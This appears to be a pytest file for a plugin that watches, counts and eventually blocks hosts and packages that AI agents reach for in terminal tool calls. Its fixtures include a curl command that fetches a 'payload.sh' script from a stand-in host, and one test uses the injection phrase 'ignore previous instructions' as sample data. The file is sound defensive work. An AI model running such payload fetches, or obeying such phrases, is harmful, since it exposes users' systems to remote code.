"""Watch rules: watch a host or package first, count how often agents reach for it, then block it.

Contracts (2026-11-24): a rule starts in watch, and a call that names it (a host or its subdomain,
a package an install command names) is flagged and counted per rule and agent but never refused, in
any mode; promoted to enforce, the same call is refused in Block mode; the rule keeps its id and its
hits across the move; taking an enforced rule off or back to watch is a weakening change (the
approval gate asks), adding or promoting is not; an organisation's rules only watch, can not be
promoted here, and an older set can not replace a newer one; a rule is suggested from a finding
(the package or host it names); a watch finding is never shared outside the machine.
"""

from __future__ import annotations

import pytest

from plugins.blackbox import guard, watch
from plugins.blackbox.community.sharing import NEVER_SHARED_SOURCES

INSTALL = {"command": "npm install left-pad@1.3.0"}
FETCH = {"command": "curl -sL https://cdn.files.example.top/payload.sh"}


@pytest.fixture(autouse=True)
def _home(tmp_path, monkeypatch):
    monkeypatch.setenv("BLACKBOX_HOME", str(tmp_path / "blackbox"))
    monkeypatch.setenv("HERMES_HOME", str(tmp_path / "hermes"))
    (tmp_path / "hermes").mkdir()


def _block_mode(on: bool) -> None:
    from plugins.blackbox.kernel import settings
    assert settings.write_settings({"mode": "block" if on else "audit"})["ok"]


def _rule(value: str) -> watch.RuleView:
    return next(r for r in watch.view() if r["value"] == value)


def test_a_watched_host_or_package_is_flagged_and_counted_and_never_refused():
    _block_mode(True)
    assert watch.add("host", "Files.Example.Top")["ok"] and watch.add("package", "npm:left-pad")["ok"]
    for args in (FETCH, INSTALL):
        verdict = guard.tool_call_verdict("terminal", args, agent="codex")
        assert verdict["decision"] != "block"
        assert any(f["identifier"].startswith("watch:") for f in verdict["findings"])
    assert _rule("files.example.top")["hits"] == 1 and _rule("npm:left-pad")["last_agent"] == "codex"
    assert "custom" in NEVER_SHARED_SOURCES   # a watch finding is the person's own rule: never shared


def test_a_promoted_rule_blocks_and_keeps_its_id_and_hits():
    _block_mode(True)
    watch.add("package", "npm:left-pad")
    guard.tool_call_verdict("terminal", INSTALL)
    before = _rule("npm:left-pad")
    assert watch.promote(before["rule_id"])["ok"]
    verdict = guard.tool_call_verdict("terminal", INSTALL)
    assert verdict["decision"] == "block" and f"watch:{before['rule_id']}" in verdict["blocked"]
    after = _rule("npm:left-pad")
    assert after["state"] == "enforce" and after["rule_id"] == before["rule_id"] and after["hits"] == 2


def test_only_taking_an_enforced_rule_off_or_back_to_watch_turns_protection_down():
    watch.add("host", "a.example.top")
    watch.add("host", "b.example.top")
    watch.promote(_rule("a.example.top")["rule_id"])
    assert watch.weakening({"rules": [{"kind": "host", "value": "a.example.top", "state": "enforce"}]}) == []
    assert watch.weakening({"rules": [{"kind": "host", "value": "a.example.top", "state": "watch"}]})
    assert watch.weakening({"rules": []}) == ["Stop blocking a.example.top (your watch rule)"]


def test_an_organisations_rules_only_watch_and_an_older_set_is_refused():
    _block_mode(True)
    watch.set_organisation_rules(2, [{"kind": "host", "value": "files.example.top", "state": "enforce"}])
    verdict = guard.tool_call_verdict("terminal", FETCH)
    assert verdict["decision"] != "block" and _rule("files.example.top")["origin"] == "organisation"
    assert not watch.promote(_rule("files.example.top")["rule_id"])["ok"]
    with pytest.raises(ValueError):
        watch.set_organisation_rules(1, [])
    assert watch.set_organisation_rules(0, []) == () and watch.view() == []


def test_a_rule_is_suggested_from_a_finding():
    package = {"identifier": "dependency:npm:left-pad", "title": "Malicious package left-pad",
               "matched": "npm:left-pad@1.3.0", "fields": {"ecosystem": "npm", "package_name": "left-pad"}}
    host = {"identifier": "ioc:url", "title": "Known-bad url", "matched": "https://cdn.files.example.top/x"}
    assert watch.suggest(package)["value"] == "npm:left-pad"
    assert watch.suggest(host) == {"kind": "host", "value": "cdn.files.example.top", "note": "from a finding: Known-bad url"}
    assert watch.suggest({"identifier": "injection:x", "matched": "ignore previous instructions"}) is None
